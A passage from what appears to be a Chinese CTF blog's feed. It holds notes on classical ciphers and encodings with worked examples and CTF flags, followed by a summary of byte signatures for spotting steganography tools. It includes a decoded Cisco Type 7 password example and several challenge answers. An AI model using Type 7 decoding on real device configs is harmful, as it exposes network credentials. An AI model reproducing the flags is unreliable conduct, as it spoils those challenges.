Codes(诗歌密码)"></a>33.Poem Codes(诗歌密码)</h3><p>简介：<a href="https://blog.csdn.net/weixin_46198176/article/details/120663625">CSDN</a></p><p>解密脚本：<a href="https://github.com/abpolym/crypto-tools/tree/master/poemcode">GITHUB</a></p><h3 id="34-元素周期表密码"><a href="#34-元素周期表密码" class="headerlink" title="34.元素周期表密码"></a>34.元素周期表密码</h3><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538119.png"></p><p>密文：<code>9 57 64 8 39 8 92 3 19 99 102 74</code><br>对应的密码就是：<code>f la gd o y o u li k es no w</code></p><h3 id="35-六十年甲子-千支表"><a href="#35-六十年甲子-千支表" class="headerlink" title="35.六十年甲子(千支表)"></a>35.六十年甲子(千支表)</h3><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538120.png"></p><p>甲戌  11<br>甲寅  51<br>甲寅  51<br>癸卯  40<br>己酉  46<br>甲寅  51<br>辛丑  38</p><p>由题意可知：加一个甲子，所以所有的数字都加60，</p><p>于是变成71 111 111 100 106 111 98</p><p>带入acsii表进行对照得到： Goodjob</p><h3 id="36-ADFGX密码"><a href="#36-ADFGX密码" class="headerlink" title="36.ADFGX密码"></a>36.ADFGX密码</h3><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538121.png" alt="image-20221106101344083"></p><h3 id="37-Pokemon-Go-Unown-字母"><a href="#37-Pokemon-Go-Unown-字母" class="headerlink" title="37.Pokemon Go Unown 字母"></a>37.Pokemon Go Unown 字母</h3><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538122.jpg" alt="s-l1600"></p><h3 id="38-老年机键盘密码"><a href="#38-老年机键盘密码" class="headerlink" title="38.老年机键盘密码"></a>38.老年机键盘密码</h3><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538123.png" alt="20200409161603473"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">999     ---&gt;   y</span><br><span class="line">666     ---&gt;   o</span><br><span class="line">88      ---&gt;   u</span><br><span class="line">2       ---&gt;   a</span><br><span class="line">777     ---&gt;   r</span><br><span class="line">33      ---&gt;   e</span><br><span class="line">6       ---&gt;   m</span><br><span class="line">999     ---&gt;   y</span><br><span class="line">4       ---&gt;   g</span><br><span class="line">4444    ---&gt;   i</span><br><span class="line">777     ---&gt;   r</span><br><span class="line">555     ---&gt;   l</span><br><span class="line">333     ---&gt;   f</span><br><span class="line">777     ---&gt;   r</span><br><span class="line">444     ---&gt;   i</span><br><span class="line">33      ---&gt;   e</span><br><span class="line">66      ---&gt;   n</span><br><span class="line">3       ---&gt;   d</span><br><span class="line">7777    ---&gt;   s</span><br><span class="line"></span><br><span class="line">youaremygirlfriends</span><br></pre></td></tr></table></figure><h3 id="39-塞尔达传说荒野之息"><a href="#39-塞尔达传说荒野之息" class="headerlink" title="39.塞尔达传说荒野之息"></a>39.塞尔达传说荒野之息</h3><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538124.jpg" alt="塞尔达传说荒野之息"></p><h3 id="40-unicode"><a href="#40-unicode" class="headerlink" title="40.unicode"></a>40.unicode</h3><p>解码网站：<a href="https://www.toolscat.com/decode/unicode">https://www.toolscat.com/decode/unicode</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u0065\u0047\u006c\u0069\u005a\u0057\u0067\u0074\u0061\u0032\u0056\u006a\u0062\u0032\u0063\u0074\u0064\u006e\u006c\u0032\u0059\u0057\u0073\u0074\u0062\u0057\u006c\u0073\u0061\u0057\u0077\u0074\u0062\u0058\u006c\u0074\u005a\u0057\u0059\u0074\u0059\u006e\u0056\u0077\u0059\u0057\u0067\u0074\u0065\u006d\u0056\u0077\u0061\u0057\u0067\u0074\u0061\u0047\u0046\u0069\u0065\u0057\u0073\u0074\u0062\u0047\u0056\u0073\u0064\u0057\u0051\u0074\u0059\u0032\u0039\u0073\u0064\u0057\u0073\u0074\u0062\u0048\u006c\u0030\u0062\u0032\u0077\u0074\u0061\u0033\u0056\u0074\u0061\u0057\u0067\u0074\u0062\u0057\u0039\u0036\u0064\u0058\u0067\u003d</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cyber使用Unescape string：</span><br><span class="line">eGliZWgta2Vjb2ctdnl2YWstbWlsaWwtbXltZWYtYnVwYWgtemVwaWgtaGFieWstbGVsdWQtY29sdWstbHl0b2wta3VtaWgtbW96dXg=</span><br></pre></td></tr></table></figure><h3 id="41-BubbleBabble-冒泡密码"><a href="#41-BubbleBabble-冒泡密码" class="headerlink" title="41.BubbleBabble(冒泡密码)"></a>41.BubbleBabble(冒泡密码)</h3><p>解密网站：<a href="http://www.hiencode.com/bubble.html">http://www.hiencode.com/bubble.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xibeh-kecog-vyvak-milil-mymef-bupah-zepih-habyk-lelud-coluk-lytol-kumih-mozux</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AVFN&#123;h_xa0j_jU@g_!_guvaX&#125;</span><br></pre></td></tr></table></figure><h3 id="42-type-7-类型-7"><a href="#42-type-7-类型-7" class="headerlink" title="42.type-7(类型-7)"></a>42.type-7(类型-7)</h3><p>解密网站：</p><p><a href="https://www.bejson.com/encrypt/type7_decode/">https://www.bejson.com/encrypt/type7_decode/</a></p><p><a href="http://web.chacuo.net/safeciscotype7">http://web.chacuo.net/safeciscotype7</a></p><p><a href="http://www.atoolbox.net/Tool.php?Id=992">http://www.atoolbox.net/Tool.php?Id=992</a></p><p>Type7混淆加密，是一种可逆的XOR密码，某科设备做ospf 接口认证的时候可以配置加密类型为Type7。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">094F5A0F0A0D1805103B0B3D143117183B720438350A45550967674D1E064F2969784440455A460F1A1B</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;Wow_u_Kn0w_Ci$c0_Type7_P@ssword!&#125;</span><br></pre></td></tr></table></figure><h3 id="43-福尔摩斯小人密码"><a href="#43-福尔摩斯小人密码" class="headerlink" title="43.福尔摩斯小人密码"></a>43.福尔摩斯小人密码</h3><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538125.png" alt="image-20221214143743801"></p><h3 id="44-银河密码"><a href="#44-银河密码" class="headerlink" title="44.银河密码"></a>44.银河密码</h3><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538126.png" alt="image-20221214144312199"></p><h3 id="45-魔女之旅密码"><a href="#45-魔女之旅密码" class="headerlink" title="45.魔女之旅密码"></a>45.魔女之旅密码</h3><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538127.png" alt="image-20221214144526851"></p><h3 id="46-JJencode"><a href="#46-JJencode" class="headerlink" title="46.JJencode"></a>46.JJencode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$=~[];$=&#123;___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:(&#123;&#125;+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:(&#123;&#125;+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$&#125;;$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+&quot;\\&quot;+添加+&quot;\&quot;&quot;)())();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.$$$_+$.$__$+$.___+$.__$+$.$$$$+$.$$$_+$.$__$+$.__$+&quot;-&quot;+$.$_$$+$.$_$_+$.$$_$+$.$$_+&quot;-&quot;+$.$__+$.$_$_+$.$$$$+$.$$$+&quot;-&quot;+$.$__$+$.$__$+$.$$_+$._$$+&quot;-&quot;+$.$$_$+$.$_$_+$.$$_$+$.$___+$.__$+$._$_+$.$$$$+$.$_$+$.$$_+$._$_+$.$__+$.$$_$</span><br></pre></td></tr></table></figure><p>将添加的位置替换为上面的小段的jjencode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$=~[];$=&#123;___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:(&#123;&#125;+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:(&#123;&#125;+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$&#125;;$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+&quot;\\&quot;+$.$$$_+$.$__$+$.___+$.__$+$.$$$$+$.$$$_+$.$__$+$.__$+&quot;-&quot;+$.$_$$+$.$_$_+$.$$_$+$.$$_+&quot;-&quot;+$.$__+$.$_$_+$.$$$$+$.$$$+&quot;-&quot;+$.$__$+$.$__$+$.$$_+$._$$+&quot;-&quot;+$.$$_$+$.$_$_+$.$$_$+$.$___+$.__$+$._$_+$.$$$$+$.$_$+$.$$_+$._$_+$.$__+$.$$_$+&quot;\&quot;&quot;)())();</span><br></pre></td></tr></table></figure><p>使用<a href="http://www.hiencode.com/jjencode.html">在线网站</a>得到，使用工具<a href="https://github.com/Leon406/ToolsFx">ToolsFx</a>也可以。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e901fe91-bad6-4af7-9963-dad812f5624d</span><br></pre></td></tr></table></figure><h3 id="47-Baudot-Code-博多码"><a href="#47-Baudot-Code-博多码" class="headerlink" title="47.Baudot Code(博多码)"></a>47.Baudot Code(博多码)</h3><p>5个01为一组的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10000 10100 11000 00101 00001 00100 10011 10100 11000 00100 10010 00110 01111 00001 00100 01110 00011 10000 00101 00100</span><br><span class="line">00011 01100 01001 00100 10000 10100 11000 00101 00001 00100 10011 10100 11000 00100 01001 11000 01100 11011  00101 11111</span><br><span class="line">10000 00100 10010 00110 01111 00001 00100 01110 00011 10000 00101 00100 00011 01010 00001 00100 00101 00110 10010 00001 </span><br><span class="line">01100 10000</span><br></pre></td></tr></table></figure><p>在线网站：<a href="https://www.boxentriq.com/code-breaking/baudot-code">https://www.boxentriq.com/code-breaking/baudot-code</a></p><h3 id="48-兽音"><a href="#48-兽音" class="headerlink" title="48.兽音"></a>48.兽音</h3><p>自定义4个字符，就可以进行加密，所以以后遇到了4个字符的加密，很有可能是兽音，因为他支持自定义。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~呜喵喵喵喵呜呜啊呜啊呜喵呜呜~喵啊喵啊喵啊呜喵呜~~~喵~呜喵啊喵啊喵喵喵呜呜~呜~呜喵呜呜啊啊~呜啊喵啊呜喵呜呜啊~喵~呜呜喵喵~喵喵喵呜呜呜喵~呜喵呜呜啊~呜啊啊喵啊呜喵呜呜喵~喵~呜喵呜~~喵喵喵呜啊呜啊喵呜喵呜呜啊~呜啊啊喵啊呜~啊喵~~喵~呜呜喵喵喵喵喵喵呜啊呜呜~呜喵呜呜~喵~喵啊喵啊呜~~啊啊~喵~呜呜喵喵啊喵喵喵呜呜呜呜~呜喵呜呜~呜啊~啊喵啊呜~~啊啊~喵~呜呜喵喵呜喵喵喵呜啊喵呜喵呜喵呜呜啊呜啊啊啊喵啊呜喵喵呜啊~喵~呜喵呜喵喵喵喵喵呜啊喵喵呜呜喵呜呜~喵~啊啊喵啊呜~~啊啊~喵~呜喵呜~啊喵喵喵呜呜~喵啊呜喵呜呜啊啊呜喵啊喵啊呜~呜~喵~喵~呜呜喵喵喵喵喵喵呜啊喵喵啊呜喵呜呜~呜呜呜啊喵啊呜喵呜啊喵啊</span><br></pre></td></tr></table></figure><p>在线网站：<a href="http://hi.pcmoe.net/roar.html">http://hi.pcmoe.net/roar.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CatCTF&#123;d0_y0u_Hate_c4t_ba3k1ng_?_M1ao~&#125;</span><br></pre></td></tr></table></figure><h3 id="49-A1Z26密码"><a href="#49-A1Z26密码" class="headerlink" title="49.A1Z26密码"></a>49.A1Z26密码</h3><p>这个最简单了，根据名字A1，Z26，所以就是说A等于1，Z等于26，那B就等于2，C就等于3，以此类推..</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8-1-16-16-25-2-9-18-20-8-4-1-25-7</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;happybirthdayg</span><br></pre></td></tr></table></figure><p>在线网站：<a href="http://www.atoolbox.net/Tool.php?Id=916%5C">http://www.atoolbox.net/Tool.php?Id=916\</a></p><h3 id="50-Alphabet-Wakanda-漫威电影"><a href="#50-Alphabet-Wakanda-漫威电影" class="headerlink" title="50.Alphabet Wakanda(漫威电影)"></a>50.Alphabet Wakanda(漫威电影)</h3><p>漫威电影Wakanda国度使用的一种字体。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538128.png" alt="image-20230114133443757"></p><p>在线网站：<a href="https://www.dcode.fr/alphabet-wakanda">https://www.dcode.fr/alphabet-wakanda</a></p><h3 id="51-五笔-中文电码-郑码-四角号码-仓颉输入法"><a href="#51-五笔-中文电码-郑码-四角号码-仓颉输入法" class="headerlink" title="51. 五笔 中文电码 郑码 四角号码 仓颉输入法"></a>51. 五笔 中文电码 郑码 四角号码 仓颉输入法</h3><ol><li>五笔输入法</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ovty fgh wnn ---&gt; 数十亿 </span><br><span class="line">在线网站：http://www.ccred.cn/tools/WubiOL.asp</span><br></pre></td></tr></table></figure><ol start="2"><li>中文电码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1265 1265 0815 0132 0637 1331 5045 0716 ---&gt; 妈妈喊你去学习呢</span><br><span class="line">在线网站：https://dianma.bmcx.com/</span><br></pre></td></tr></table></figure><p>   3.郑码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MAZY AGD BMY NFA XOBV UCL A MFJI ---&gt; 每天都体验着一种</span><br><span class="line">在线网站：https://zhengmashurufa.bmcx.com/</span><br></pre></td></tr></table></figure><ol start="4"><li>四角号码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">40227 44801 36780 27620 ---&gt; 有共识的</span><br><span class="line">在线网站：http://sijiao.118cha.com/40227.html</span><br></pre></td></tr></table></figure><ol start="5"><li>仓颉输入法</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YPTC QVIO MGBHU JYK ---&gt; 虚拟现实</span><br><span class="line">在线网站：https://cangjieshurufa.bmcx.com/</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>诸如SHA家族（SHA1&#x2F;SHA224&#x2F;SHA256……）、UrlEncode&#x2F;UrlDecode等，一般不会用。<br>解密网站：有许多，这里贴出一个,<a href="http://encode.chahuo.com/">戳我</a></p>]]></content>
      
      
      <categories>
          
          <category> 记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>隐写总结</title>
      <link href="/posts/1154.html"/>
      <url>/posts/1154.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-SilentEye"><a href="#1-SilentEye" class="headerlink" title="1.SilentEye"></a>1.SilentEye</h1><p><strong>支持类型：PNG、JPG、JPEG、BMP、TIF、TIFF、WAV</strong></p><p><strong>虽然可以隐写PNG格式，但是隐写保存的格式只能为JPG或者BMP</strong></p><ol><li>JPG类型特征：</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538472.jpg" alt="silenteye"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538473.png" alt="image-20221108082326638"></p><p>如果你碰到了如下的图片，有很多小圆圈，那你用<code>stegsolve</code>也会看到很多的小圆圈，所以你就不要再去使用 <code>stegsolve</code> 去看通道了，直接大胆点盲猜图片被<code>SilentEye</code> 工具隐写了（图片来之[SICTF2023 Misc 王八树木]）</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538474.png" alt="image-20230119140407725"></p><p>该题的层结构大小从上往下依次为<code>0x45, 0x45, 0x13, 0x21, 0xB7, 0x21, 0xB7</code>（注意：这个不是一定主要的技巧是使用 <code>stegsolve</code> 看通道）</p><ol start="2"><li>BMP类型没有太多特征</li></ol><br><h1 id="2-wbStego4"><a href="#2-wbStego4" class="headerlink" title="2.wbStego4"></a>2.wbStego4</h1><p><strong>支持类型：BMP、RLE、PDF（常见）</strong></p><ol><li>BMP类型特征：</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538475.jpg" alt="wbStego4"></p><p>最低位有明显隐写特征</p><ol start="2"><li>PDF类型特征：</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538476.jpg" alt="wb4_pdf"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538477.jpg" alt="wb4_pdf2"></p><p>有明显的：<code>09 09 09 20 20 09 20 09 0D</code>的字节特征，主要字节是<code>09 20 0D</code>。</p><p>以下内容来源：<a href="https://www.cnblogs.com/sherlson/articles/15851383.html">https://www.cnblogs.com/sherlson/articles/15851383.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wbStego4open是一个隐写开源工具，它支持Windows和Linux平台。</span><br><span class="line">你可以用wbStego4open可以把文件隐藏到BMP、TXT、HTM和PDF文件中，且不会被看出破绽。</span><br><span class="line">还可以用它来创建版权标识文件并嵌入到文件中将其隐藏。</span><br><span class="line">wbStego在插入数据时（此处以非加密的版权信息为例），充分利用了插入法和LSB修改法两种技术。</span><br><span class="line">wbStego4open会把插入数据中的每一个ASCII码转换为二进制形式，</span><br><span class="line">然后把每一个二进制数字再替换为十六进制的20或者09，20代表0，09代表1。</span><br><span class="line">例如，在wbStego4open的版权管理器（Copyright Manager）中，输入一个包含“Oblivion”的地址，</span><br><span class="line">wbStego4open就会将其由ASCII码转换成相应的二进制码，</span><br><span class="line">然后再用0x20和0x09替换每个二进制数。</span><br></pre></td></tr></table></figure><p>如何判断是否文件采用<code>wbStego4open</code>加密？</p><ol><li>将文件导入010editor、winhex之类的十六进制查看工具</li><li>如果<code>20</code>、<code>09</code>出现次数较多，则有可能为<code>wbStego4open</code>加密</li><li><strong>当隐写的内容很少的时候大概率没有20、09出现最多的特征了，最好参考上图的字节特征。</strong></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538479.png" alt="image-20221202162449054"></p><br><h1 id="3-cloacked-pixel"><a href="#3-cloacked-pixel" class="headerlink" title="3.cloacked-pixel"></a>3.cloacked-pixel</h1><p><strong>支持类型：PNG、JPG(隐写后自动转换为PNG)</strong></p><p>特征如下：</p><ol><li>IDAT层大小</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538480.png" alt="image-20221115180358321"></p><p>IDAT结构大小会为0x1000C，其中length占4字节，IDAT标记占4字节，内容占65536字节，CRC32占4字节。</p><p><code>65536 + length + IDAT + CRC32 = 0x1000C</code>，也就是每个IDAT层会被装满。</p><ol start="2"><li>图片位深度32位，但是你使用<code>StegSolve</code>观察图片的时候，Alpha通道全部都是255，也就是白色。</li></ol><br><h1 id="4-steghide"><a href="#4-steghide" class="headerlink" title="4.steghide"></a>4.steghide</h1><p><strong>支持类型：JPG</strong></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538481.png" alt="image-20221115190104544"></p><p>层大小从上往下依次为<code>0x45, 0x45, 0x13, 0x21, 0xB7, 0x21, 0xB7</code></p><br><h1 id="5-outguess"><a href="#5-outguess" class="headerlink" title="5.outguess"></a>5.outguess</h1><p><strong>支持类型：JPG</strong></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538481.png" alt="image-20221115190104544"></p><p>层大小从上往下依次为<code>0x45, 0x45, 0x13, 0x21, 0xB7, 0x21, 0xB7</code></p><br><h1 id="6-stegpy"><a href="#6-stegpy" class="headerlink" title="6.stegpy"></a>6.stegpy</h1><p><strong>支持类型：PNG、JPG、GIF、BMP、WEBP、&#x3D;&#x3D;WAV&#x3D;&#x3D;</strong></p><p><strong>除了PNG格式其他的图片格式隐写后自动转换为PNG</strong></p><p>特征如下：</p><ol><li>IDAT层大小</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538480.png" alt="image-20221115180358321"></p><p>IDAT结构大小会为0x1000C，其中length占4字节，IDAT标记占4字节，内容占65536字节，CRC32占4字节。</p><p><code>65536 + length + IDAT + CRC32 = 0x1000C</code>，也就是每个IDAT层会被装满。</p><ol start="2"><li>图片位深度32位，但是你使用<code>StegSolve</code>观察图片的时候，Alpha通道全部都是255，也就是白色。</li></ol><br><h1 id="7-jphide"><a href="#7-jphide" class="headerlink" title="7.jphide"></a>7.jphide</h1><p><strong>支持类型：JPG、JPEG</strong></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538482.png" alt="image-20221118192116807"></p><p>层大小从上往下依次为<code>0x45, 0x45, 0x13, 0x21, 0x8D, 0x21, 0x84</code></p><br><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538483.png" alt="image-20221118193139991"></p><p>bugku奇怪的压缩包中的<code>xiaoxiaoshumu.jpg</code>，也出现了不一样的情况</p><p>层大小从上往下依次为<code>0x45, 0x45, 0x13, 0x1E, 0x53, 0x1C, 0x2A</code></p><br><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538484.png" alt="image-20221209130453397"></p><p>首届“天权信安&amp;catf1ag”网络安全联合公开赛中的一题<code>嘿嘿.jpg</code>，也出现了不一样情况</p><p>层大小从上往下依次为<code>0x45, 0x45, 0x13, 0x1E, 0x4D, 0x1B, 0x25</code></p><br><h1 id="8-Free-File-Camouflage"><a href="#8-Free-File-Camouflage" class="headerlink" title="8.Free File Camouflage"></a>8.Free File Camouflage</h1><p><strong>支持类型：JPG</strong></p><ol><li>尾部会出现很多base64字段</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538485.png" alt="image-20221118193524649"></p><ol start="2"><li>如果隐写的内容较少会出现，你会看见尾部的特征结构如下：</li></ol><p><code>FF D9</code> + <code>第一段base64</code> + <code>0D 0A</code> +  <code>第二段base64</code> + <code>0D 0A</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538486.png" alt="image-20221118193630649"></p><br><h1 id="9-DeEgger-Embedder"><a href="#9-DeEgger-Embedder" class="headerlink" title="9.DeEgger Embedder"></a>9.DeEgger Embedder</h1><p><strong>支持类型：PNG、JPG</strong></p><p><strong>PNG特征：</strong></p><ol><li>尾部会出现很多无意义的字符</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538487.png" alt="image-20221118194554713"></p><ol start="2"><li>IDAT层的大小都为<code>0x200C</code>（除了最后一层IDAT）</li></ol><p><strong>JPG特征：</strong></p><ol><li>尾部会出现很多无意义的字符</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538488.png" alt="image-20221118194949346"></p><br><h1 id="10-F5-steganography"><a href="#10-F5-steganography" class="headerlink" title="10.F5-steganography"></a>10.F5-steganography</h1><p>特征：<strong>早期F5算法总插入</strong><code>AJPEG Encoder Copyright 1998, James R. Weeks and BioElectroMech.</code></p><p>命令<code>java Extract 图片名称 (-p password)</code>会生成output.txt，隐写内容就在里面。</p><br><h1 id="11-OurSecret"><a href="#11-OurSecret" class="headerlink" title="11.OurSecret"></a>11.OurSecret</h1><ol><li>JPG特征：</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538489.png" alt="image-20221208221306007"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538490.png" alt="image-20221208221342521"></p><p>特征是这个<code>ž—º*</code>，会在jpg文件层结束后出现。</p><p>尾部特征是<code>l&lt;9l0kl10n88j:8&lt;....</code></p><br><ol start="2"><li>PNG特征：</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538491.png" alt="image-20221208221706530"></p><p>和上述的JPG特征一样。</p><br><h1 id="12-JSteg"><a href="#12-JSteg" class="headerlink" title="12.JSteg"></a>12.JSteg</h1><p>JPG特征：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538492.png" alt="image-20221213144232849"></p><p>层大小从上往下依次为<code>0x86, 0x13, 0x1A4</code></p>]]></content>
      
      
      <categories>
          
          <category> 记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>配置WSL2和Misc各种工具</title>
      <link href="/posts/44904.html"/>
      <url>/posts/44904.html</url>
      
